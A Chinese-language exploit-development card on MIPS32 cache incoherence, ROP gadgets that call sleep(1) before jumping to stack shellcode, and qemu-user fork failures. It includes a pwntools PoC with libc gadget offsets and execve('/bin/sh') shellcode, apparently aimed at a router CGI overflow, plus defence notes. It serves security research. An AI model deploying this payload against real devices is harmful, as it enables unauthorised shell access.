---
id: binary-pwn-rop-mips32-shellcode-cache-coherence-sleep
title: MIPS32 栈上 shellcode 的 I/D cache 同步：ROP 调 sleep 后跳转，兼 qemu-user 下 system() fork 失败
type: scenario
domain: binary
path: binary/pwn/rop
technique: mips32-rop-sleep-cache-coherent-shellcode
aliases:
- MIPS cache incoherence
- MIPS I-cache D-cache
- sleep before shellcode
- ROP+shellcode MIPS
- qemu-mipsel system fork
- jalr shellcode
tags:
- mips
- mipsel
- rop
- shellcode
- cache
- stack-overflow
- qemu
- exploit-dev
cve: []
severity: medium
confidence: high
status: draft
created: '2026-11-07'
updated: '2026-11-07'
---

## 一句话结论

MIPS32 的指令缓存（I-cache）与数据缓存（D-cache）不保证硬件一致：栈上刚写入的 shellcode 先落在 D-cache，立即 `jalr` 过去可能执行到旧指令；可靠做法是先用 ROP 调用 `sleep(1)`（或 `cacheflush` 类系统调用）留出同步时间，再跳到栈上 shellcode 执行 `execve`。另外，`qemu-mipsel` 用户模式下 `system()` 内部 `fork()` 会失败，导致 `$fp` 为空并在 `lw $v0,0x180($fp)` 处崩溃，因此依赖 `system()`/`fork()` 的纯 ROP 链必须在 `qemu-system-mipsel` 或真机上验证；本文的 sleep+shellcode 链不经过 `system()`，不受此限制。

## 原理

- **I/D cache 不一致**：MIPS 采用分离的指令缓存与数据缓存；CPU 取指走 I-cache，写内存走 D-cache，二者之间没有 x86 那样的硬件一致性协议。把 shellcode 写入栈（数据写）后立刻跳转执行（取指），I-cache 可能仍是旧内容，导致执行到错误指令或非法指令。
- **同步手段**：最直接的是调用 `cacheflush` 系统调用（参数为用户地址区间与 cache 类型，具体编号/ABI 依内核与 O32/N32 而定）；工程上更简单的是先执行一次系统调用或 `sleep(1)`，借上下文切换与时间窗口让缓存同步。文中采用的是 ROP 调 `sleep(1)` 再跳 shellcode 的方式，属于经验性但常用的做法。
- **ROP+shellcode 链的结构**（文中样本，地址随固件/libc 变化）：
  - `s1 = libc_base + 0x436D0`：`move $t9,$s3; ...; jalr $t9`，用于调用 `$s3` 指向的函数；
  - `s3 = libc_base + 0x56BD0`：`sleep`；
  - `ra = libc_base + 0x57E50`：`li $a0,1; jalr $s1`，即 `sleep(1)`；
  - `s4 = libc_base + 0x37E6C`：`move $t9,$a1; jalr $t9`，用于跳到 shellcode；
  - `ra2 = libc_base + 0x3B974`：`addiu $a1,$sp,0x18; jalr $s4`，把 `$a1` 设为栈上 shellcode 地址并跳转；
  - shellcode 放在 `$sp+0x18`，使用 `li $v0, 4011; syscall 0x40404`（MIPS o32 的 `execve`）执行 `//bin/sh`。
- **为什么 shellcode 要避开坏字符**：这类入口常是 `sprintf`/字符串拷贝，`\x00` 会截断 payload；shellcode 中的立即数、地址也要避免 `\x00`、换行等会破坏 HTTP/Cookie 的字节。
- **qemu-user 的 `fork` 限制**：`system()` 的实现会 `signal()` 后 `fork()`；文中在 `qemu-mipsel` 用户模式下观察到该 `fork()` 失败（用户模式对进程/线程模拟有限制），后续 `$fp` 为 0，执行 `lw $v0, 0x180($fp)` 时访问空指针崩溃。这不是 ROP 链本身的问题，而是仿真环境限制；改用 `qemu-system-mipsel`（完整系统）或真机即可验证。
- **为什么仍值得用 ROP+shellcode**：当目标有可执行栈、但没有合适的 `system`/`execve` 调用链，或需要在受限字符集下自定义系统调用时，直接跳 shellcode 更灵活；代价是要处理 cache 同步和坏字符。

## 触发条件

- 目标为 MIPS32（mipsel/mipseb）程序，存在可控制的栈溢出且栈可执行（无 NX 或已 mprotect）。
- 能通过溢出控制 `$ra`/`$s0-$s7` 等保存寄存器，且有可用的 `move $t9,$sX; jalr $t9`、`addiu $a1,$sp,off; jalr` 类 gadget。
- 能把 shellcode 写入栈上已知/可计算地址，并避开入口的坏字符限制。
- 验证环境为 `qemu-system-mipsel` 或真机；仅用 `qemu-mipsel` 用户模式验证 `system()` 相关链会误判为失败。

## 利用步骤

1. 用 cyclic/调试确认溢出偏移与保存寄存器布局，计算 ROP 结束后 `$sp` 的位置以及 shellcode 在栈上的落点（文中为 `$sp+0x18`）。
2. 在 libc/固件中找 gadget：一个用于调用 `sleep`/`cacheflush`，一个用于把 shellcode 地址放入参数寄存器并间接跳转（`move $t9,$a1; jalr $t9` 等）。
3. 构造第一段 ROP：调用 `sleep(1)`（或 `cacheflush`），让 I-cache 有时间同步。
4. 构造第二段 ROP：把 `$a1` 设为 `$sp+0x18`，跳到 shellcode；shellcode 用 `execve("//bin/sh", NULL, NULL)` 或反弹 Shell 系统调用。
5. 检查 shellcode 与 ROP 地址是否含 `\x00`、`\n`、`\r` 等会被入口截断的字节；必要时换 gadget 或用编码器。
6. 在 `qemu-system-mipsel` 中运行并抓取 shell；若在 `qemu-mipsel` 用户模式卡在 `lw $v0,0x180($fp)`，确认是 `system()` 的 `fork` 限制而非链错误。
7. 真机/系统模式下若仍失败，检查 cache 同步是否足够（增大 sleep、改用 `cacheflush`）、栈地址是否对齐、shellcode 是否被截断。

## PoC

```python
from pwn import *
context(os='linux', arch='mips', log_level='debug')

libc_base = 0x7F738000
payload  = b'a' * 0x3cd
payload += b'a' * 4                        # s0
payload += p32(libc_base + 0x436D0)        # s1: move $t9,$s3; ... jalr $t9
payload += b'a' * 4                        # s2
payload += p32(libc_base + 0x56BD0)        # s3: sleep
payload += b'a' * (4 * 5)                  # s4-s7/fp 占位
payload += p32(libc_base + 0x57E50)        # ra: li $a0,1; jalr $s1  -> sleep(1)
payload += b'a' * 0x18                     # 到第二段链
payload += b'a' * (4 * 4)
payload += p32(libc_base + 0x37E6C)        # s4: move $t9,$a1; jalr $t9
payload += p32(libc_base + 0x3B974)        # ra: addiu $a1,$sp,0x18; jalr $s4
payload += b'a' * 0x18
payload += asm('''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
''')
```

说明：PoC 按文中 ROP+shellcode 脚本整理，gadget 偏移与 libc 基址随固件/环境变化。原文中纯 ROP（调用 `system`）链在 `qemu-mipsel` 用户模式因 `system()` 内 `fork()` 失败而崩溃；本 PoC 的 sleep+shellcode 链不经过 `system()`/`fork()`，原文称其可直接打通，且系统模式下已用 gdbserver + 反弹 shell 验证。未在本机复跑。

## 变体与关联

- **纯 ROP**：不跳 shellcode，直接 ROP 调 `system`/`execve`；可规避 cache 同步，但受 `system` 地址空字节、命令字符集与调用约定限制（见关联的 hedwig 卡）。
- **cacheflush 替代 sleep**：更严格地同步 I/D cache；需按 MIPS O32/N32 的 syscall 编号与参数约定构造。
- **mipseb/MIPS64**：端序、寄存器宽度、syscall 编号与 gadget 编码不同，需重新适配。
- **NX/ASLR 目标**：栈不可执行时需先 `mprotect` 或走纯 ROP；ASLR 开启时需先泄露 libc/栈地址。
- 关联：[[binary-pwn-stack-mips-hedwig-cgi-uid-rop]]（同文章中的 DIR-815 hedwig.cgi uid 栈溢出，纯 ROP 与 ROP+shellcode 的完整案例）、[[binary-pwn-rop-mips32-stack-frame-gadget-args]]（MIPS32 栈帧、mipsrop 与参数 gadget 基础）、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（QEMU 系统级固件仿真）。
- 边界：目标 I-cache/D-cache 已同步、sleep 时间不足、shellcode 含坏字符、栈地址不可预测、用户模式 QEMU 下 `fork` 不可用时，链会失败或需要换打法。

## 检测与防御

- **防御**：开启 NX（不可执行栈）、ASLR、canary、PIE；用 W^X 限制可写可执行内存；升级固件修复溢出入口。
- **检测**：进程栈出现可执行映射、`sleep`/`cacheflush` 异常调用、ROP 特征（大量 `jr $ra`/`jalr $t9` gadget 链）、CGI 进程崩溃后出现 shell；监控 `/proc/<pid>/maps` 中 `rwxp` 栈。
- **调试建议**：在 `qemu-system-mipsel` 或真机验证 shellcode；若必须用 `qemu-mipsel`，避免依赖 `system()`/`fork()`，改用直接系统调用；用 gdb-multiarch 检查 `$sp`/`$a1` 与 shellcode 落点。
